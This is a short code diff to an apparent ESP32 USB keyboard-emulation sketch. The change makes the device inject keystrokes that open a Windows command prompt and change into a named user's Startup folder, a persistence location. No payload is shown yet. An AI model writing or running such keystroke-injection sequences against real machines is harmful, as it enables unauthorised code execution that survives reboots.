@@ -5,7 +5,7 @@
 #include "USBHIDKeyboard.h"
 #include <WiFi.h>
 #include <esp_now.h>
-
+String username = "Pavilion Gaming";
 USBHIDKeyboard Keyboard;
 
 const int buttonPin = 2;
@@ -37,9 +37,21 @@ void loop() {
     // Keyboard.release(KEY_LEFT_GUI);
     // delay(1000);
 
-    // Keyboard.println("cmd");
-    // delay(100);
+    Keyboard.print("cmd");
+    delay(500);
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.release(KEY_RETURN);
+    delay(1000);
 
+    Keyboard.print("cd C:\\Users\\" + username +
+                   "\\AppData\\Roaming\\Microsoft\\Windows\\Start "
+                   "Menu\\Programs\\Startup");
+    delay(500);
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.release(KEY_RETURN);
+    delay(2000);
     // // Keyboard.press(KEY_RETURN);
     // // delay(100);
 
